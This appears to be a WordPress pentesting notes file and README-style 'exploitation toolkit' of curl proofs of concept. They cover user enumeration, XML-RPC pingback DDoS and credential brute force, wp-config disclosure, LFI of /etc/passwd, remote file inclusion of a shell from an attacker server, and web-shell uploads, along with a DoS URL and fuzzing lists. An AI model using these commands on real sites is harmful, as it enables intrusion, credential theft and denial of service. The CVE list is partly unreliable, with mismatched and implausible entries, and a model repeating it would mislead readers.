Hello there,
its still updateing its just a small demo.

##Basic Endpoints 

##Check basic things :  
common enpoints
	wp-contents
	wp-includes
	wp-admin

##DOS 
	http://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

##Information leaks : 
	http://target.com/wp-json/wp/v2/users
	http://target.com/?rest_route=/wp/v2/users

##Registration Enabled: 
	/wp-login.php?action=register
	


##FUZZING LIST : 
	wp-includes
	wp-content/uploads
	wp-content/debug.log
	Wp-load
	Wp-json
	index.php
	wp-login.php
	wp-links-opml.php
	wp-activate.php
	wp-blog-header.php
	wp-cron.php
	wp-links.php
	wp-mail.php
	xmlrpc.php
	wp-settings.php
	wp-trackback.php
	wp-ajax.php
	wp-admin.php
	wp-config.php
	.wp-config.php.swp
	wp-config.inc
	wp-config.old
	wp-config.txt
	wp-config.html
	wp-config.php.bak
	wp-config.php.dist
	wp-config.php.inc
	wp-config.php.old
	wp-config.php.save
	wp-config.php.swp
	wp-config.php.txt
	wp-config.php.zip
	wp-config.php.html
	wp-config.php~
	/wp-admin/setup-config.php?step=1
	/wp-admin/install.php


Most notable recent CVEs affecting WordPress plugins and core,

##Plugins
	WPSCAN
	Nuclei 
	Version based exploitation 

##Common Fuzzing 
	seclist
	randon-robbie (Wordpress-random)


Few Notable CVE's
CVE-2023-23488 - Vulnerability in "Paid Memberships Pro" plugin, allowing SQL injection.
CVE-2023-23489 - SQL injection flaw in "Easy Digital Downloads" plugin.
CVE-2023-23490 - SQL injection vulnerability in the "Survey Marker" plugin.
CVE-2023-28121 - Remote code execution flaw in a popular plugin enabling unauthorized actions.
CVE-2023-28122 - Cross-Site Scripting (XSS) in "WordPress Newsletter Plugin."
CVE-2023-14108 - PHP object injection leading to site takeover via "Ultimate Member."
CVE-2023-3660 - Directory traversal vulnerability in "WooCommerce Payments" plugin.
CVE-2023-6784 - SQL Injection affecting "Yoast SEO" plugin.
CVE-2023-4500 - Remote File Inclusion (RFI) in the "Slider Revolution" plugin.
CVE-2024-27198 - High-severity flaw in "Jetpack" plugin, fixed recently.
CVE-2023-30777 - Reflected XSS in "Advanced Custom Fields."
CVE-2023-29819 - Privilege escalation in "WP Fastest Cache."
CVE-2023-32243 - Authentication bypass in "Elementor Pro."
CVE-2023-36217 - SQL Injection in "All In One SEO."
CVE-2023-23559 - Remote Code Execution in "WP Bakery Page Builder."
CVE-2023-32124 - File inclusion vulnerability in "Slider Revolution."
CVE-2023-30619 - Stored XSS in "WordPress Classic Editor."
CVE-2023-23117 - SQL Injection in "NextGen Gallery."
CVE-2023-24156 - Remote Code Execution in "W3 Total Cache."
CVE-2023-18312 - SQL Injection in "Easy Digital Downloads."
CVE-2023-22167 - Arbitrary file upload in "All In One WP Security."
CVE-2023-21211 - Stored XSS in "Yoast SEO."
CVE-2023-18000 - Path Traversal in "Contact Form 7."
CVE-2023-14127 - SQL Injection in "Gravity Forms."
CVE-2023-12514 - Open Redirect in "Jetpack."
CVE-2022-37037 - Cross-Site Request Forgery (CSRF) in "WooCommerce."
CVE-2022-28120 - SQL Injection in "WP Google Maps."
CVE-2022-30991 - Directory Traversal in "WordPress REST API."
CVE-2022-41456 - Unauthenticated SQL Injection in "Easy Digital Downloads."
CVE-2022-35410 - SQL Injection in "WooCommerce Payments."



Links to Explore more
1. https://hackerone.com/reports/187520 
2. https://hackerone.com/reports/460911
3. https://hackerone.com/reports/487081
4. https://hackerone.com/reports/487081
5. https://medium.com/@qaafqasim/exploring-wordpress-juicy-endpoints-a-guide-for-bug-bounty-hunters-6a09437fb621 (ENDPOINTS)
6. https://medium.com/@sriharanmahimala125/common-vulnerabilities-in-wordpress-sites-10157635c3a4 (COMMONS)
7. https://medium.com/@redfanatic7/wordpress-vulnerabilities-and-how-to-exploit-them-c63100465c96
8. https://www.hostinger.in/tutorials/how-to-secure-wordpress?utm_campaign=Generic-Tutorials-DSA|NT:Se|LO:IN-t3&utm_medium=ppc&gad_source=1
9. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
10. https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md (Cheatsheet)





# ⚠️ WordPress Exploitation Toolkit

This repository contains a collection of Proof of Concepts (PoCs) for exploiting common vulnerabilities in WordPress core, plugins, or misconfigurations. The PoCs are designed to be simple and executed via `curl`.

---

## 🔨 Requirements

- `curl` installed on your system.
- (Optional) `jq` for parsing JSON responses.

---

## ✏️ Exploitation Techniques

### 1. Username Enumeration

#### Description
Extracts a list of usernames using the WordPress REST API.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-json/wp/v2/users" | jq
```

#### Expected Output
A JSON object containing user IDs and usernames.

---

### 2. XML-RPC Pingback Abuse

#### Description
Abuses the XML-RPC `pingback.ping` method to potentially find vulnerable endpoints or for DDoS amplification.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>http://[VICTIM_SITE]</string></value></param>
        <param><value><string>http://[TARGET_DOMAIN]</string></value></param>
    </params>
</methodCall>'
```

#### Expected Output
A response indicating whether the target site is vulnerable to pingback abuse.

---

### 3. Plugin/Theme File Disclosure (if applicable)

#### Description
Some plugins/themes expose sensitive files, such as configuration or backup files.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-content/plugins/[PLUGIN_NAME]/debug.log"
```

#### Expected Output
Contents of the exposed file (if available).

---

### 4. Directory Listing (Misconfiguration)

#### Description
Checks for publicly accessible directories due to server misconfigurations.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-content/uploads/" | grep "<title>"
```

#### Expected Output
HTML content indicating a directory listing page.

---

### 5. Password Brute Force (XML-RPC)

#### Description
Attempts to brute force login credentials via the XML-RPC method, which is commonly vulnerable to brute-force attacks.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
<methodCall>
    <methodName>wp.login</methodName>
    <params>
        <param><value><string>[USERNAME]</string></value></param>
        <param><value><string>[PASSWORD]</string></value></param>
    </params>
</methodCall>'
```

#### Expected Output
Response showing either a successful login or failure message.

---

### 6. WP-Admin Path Brute Force

#### Description
Brute forces paths to access the wp-admin login page, useful for misconfigurations or hidden paths.

#### ✔ Command
```bash
curl -s -o /dev/null -w "%{http_code}" "http://[TARGET_DOMAIN]/wp-admin/"
```

#### Expected Output
A 200 status code if the wp-admin login page exists.

---

### 7. Unauthenticated File Upload Vulnerability (Plugin/Theme)

#### Description
Some plugins/themes allow unauthenticated file uploads that could lead to Remote Code Execution (RCE) or web shell uploads.

#### ✔ Command
```bash
curl -F "file=@[FILE_PATH]" "http://[TARGET_DOMAIN]/wp-content/plugins/[PLUGIN_NAME]/upload.php"
```

#### Expected Output
Confirmation that the file was uploaded or error message.

---

### 8. WP-Config File Disclosure

#### Description
Exploits a misconfiguration to expose the `wp-config.php` file, which contains sensitive database credentials.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-config.php"
```

#### Expected Output
Contents of the `wp-config.php` file, revealing database credentials.

---

### 9. Admin Login Page Bypass (if applicable)

#### Description
Bypasses login pages through known misconfigurations or vulnerabilities.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/wp-login.php" -d "log=[USERNAME]&pwd=[PASSWORD]&wp-submit=Log+In&redirect_to=http%3A%2F%2F[TARGET_DOMAIN]%2Fwp-admin%2F"
```

#### Expected Output
Response showing if the login was successful.

---

### 10. Cross-Site Scripting (XSS) in Plugins

#### Description
Exploits XSS vulnerabilities in WordPress plugins by injecting malicious JavaScript into vulnerable plugin fields.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/wp-admin/options-general.php?page=[PLUGIN_PAGE]" -d "setting=<script>alert('XSS')</script>"
```

#### Expected Output
JavaScript alert showing the XSS payload execution.

---

### 11. Cross-Site Request Forgery (CSRF) in Admin Actions

#### Description
Exploits CSRF vulnerabilities by forcing an admin user to perform unintended actions on their WordPress site.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/wp-admin/admin-post.php" -d "action=[ACTION_NAME]&[PARAMETERS]"
```

#### Expected Output
Admin action is performed without proper authentication.

---

### 12. Local File Inclusion (LFI) via URL Parameters

#### Description
Exploits LFI vulnerabilities through URL parameters to include sensitive files like `/etc/passwd` or `wp-config.php`.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-content/themes/[THEME_NAME]/[VULNERABLE_FILE].php?page=../../../../../../etc/passwd"
```

#### Expected Output
Contents of the sensitive file, like `/etc/passwd`.

---

### 13. Remote File Inclusion (RFI)

#### Description
Exploits vulnerable include statements to execute remote files, typically used for web shell uploads or remote code execution.

#### ✔ Command
```bash
curl -s "http://[TARGET_DOMAIN]/wp-content/themes/[THEME_NAME]/[VULNERABLE_FILE].php?file=http://[ATTACKER_SERVER]/shell.php"
```

#### Expected Output
The remote shell being executed on the target server.

---

### 14. Insecure Deserialization

#### Description
Exploits insecure deserialization vulnerabilities in WordPress plugins or themes that fail to properly validate user inputs.

#### ✔ Command
```bash
curl -X POST "http://[TARGET_DOMAIN]/wp-admin/admin-ajax.php" -d "action=deserialize&data=[MALICIOUS_PAYLOAD]"
```

#### Expected Output
Successful deserialization leading to code execution or privilege escalation.

---

## 📝 Notes

- Replace `[TARGET_DOMAIN]`, `[USERNAME]`, `[PASSWORD]`, `[PLUGIN_NAME]`, `[FILE_PATH]`, etc., with actual values.
- Use these PoCs responsibly and only on systems you are authorized to test.
- For JSON responses, you can omit `| jq` if you don't have the tool installed.

---

## 📢 Disclaimer

This toolkit is for educational and authorized penetration testing purposes only. Misuse of this information can result in severe legal consequences.

## 💰 Support Me  

If you find this work helpful, you can support me:  
- [![Buy Me a Coffee](https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png)](https://buymeacoffee.com/ghost_sec)  

Thanks for your support! ❤️
